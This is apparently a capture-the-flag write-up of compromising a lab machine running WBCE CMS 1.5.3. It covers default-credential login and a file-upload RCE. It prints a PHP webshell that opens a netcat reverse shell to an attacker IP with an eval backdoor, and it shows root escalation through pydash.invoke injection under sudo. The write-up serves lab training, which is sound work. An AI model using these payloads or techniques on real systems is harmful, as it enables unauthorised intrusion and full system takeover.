### Exploitation
There is only HTTP TCP-80 port open which indicates a web application, once we go into it, there is a web page that says, the website is under construction:
![](/assets/img/Pasted-image-20250219184327.png)

The source code also has nothing interesting, so I run a `dirsearch` command:
```bash
dirsearch -u http://10.0.160.236/

```
Digging around some of this folders I also came to a redirect towards `http://webamok.echocity-f.com` so I added this entry to my `/etc/hosts file`:
```bash
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.0.160.236    webamok.echocity-f.com
```
And then, the most interesting page was the admin login page:
![](/assets/img/Pasted-image-20250219184704.png)

Which gives me an idea about the CMS in use, called `WBCE CMS`, then I started looking for exploits and my research came back with this blog about [WBCE CMS 1.5.3 RCE](https://ndmcyb.hashnode.dev/wbce-cms-153-has-a-rce-via-adminlanguagesinstallphp), all I need for it is to be authenticated, and as most of the echoCTF machines, the credentials in use should be default, so after some attempts I manage to authenticate using `admin:password`:

![](/assets/img/Pasted-image-20250219185024.png)

This makes me realize that the version is exactly the same as in the post, so all I need to do is to upload a webshell, at first it seems like there is an input validation in place, because the message `Security offense! Access denied!` shows up when we tried to access to the page:

`http://webamok.echocity-f.com/admin/languages/index.php`

![](/assets/img/Pasted-image-20250219185223.png)

But if you click on "Back" button, you got redirected to the Languages Installation feature which is vulnerable to RCE:

![](/assets/img/Pasted-image-20250219185359.png)

Then I was able to upload my webshell with the following content, I used the exact same payload as in the blog because somehow, other payloads didn't work for me:
```bash
<?php echo(system('nc -e /bin/bash 10.10.5.122 1234'));@eval($_POST[stcs]);?>
```

Don't forget to start your listener :-)

### Privilege Escalation

The privilege escalation was simple because you only have to run the command `sudo -l` and you can run this script as sudo:
```bash
www-data@webamok:/var/www/html/admin/languages$ sudo -l
Matching Defaults entries for www-data on webamok:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on webamok:
    (ALL : ALL) NOPASSWD: /usr/local/bin/amok
```
The content is a python script, which is using pydash:
```python
#!/usr/bin/python3
import sys
import random
import pydash

class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)

def amok(path, arg):
    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    amok(sys.argv[1], sys.argv[2])
```
The interesting entrypoint here is the line of code `res = pydash.invoke(obj, path, arg)`, so I investigate any vulnerability related with pydash, and I got this [Pydash Command Injection](https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518) snyk report, which has this PoC, which is similar to our script:

PoC
```bash
import sys
import random

import pydash


class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)


def poc(path, arg):
    """
        Use a malicious path to execute code via the __init__.__globals__ dict (not available with dict/list input objects?)
        I.e: pydash.invoke(obj, '__init__.__globals__.random._os.system', 'id')
    """

    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])

```
According with the comment all we need to do is pass this two arguments to our script and we'll have the `id` output command:
```bash
sudo /usr/local/bin/amok "__init__.__globals__.random._os.system" "id"
uid=0(root) gid=0(root) groups=0(root)
```

All you need is to change the `id` command for your preferred way to escalate privs.

AND WE ARE INSIDE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- Credentials for WBCE CMS are: `admin:password`

### Notes

- WBCE CMS has several vulnerabilities, our job is to find which one could be dangerous for the app, in this case, our research retrieved a sucessful RCE exploitation via unrestriced file upload, I've attempted to execute several of the payloads out there but only this one was working, while is a good idea to try all the payloads, is more important to understand what are we executing to avoid any disruption in the service, or worse...
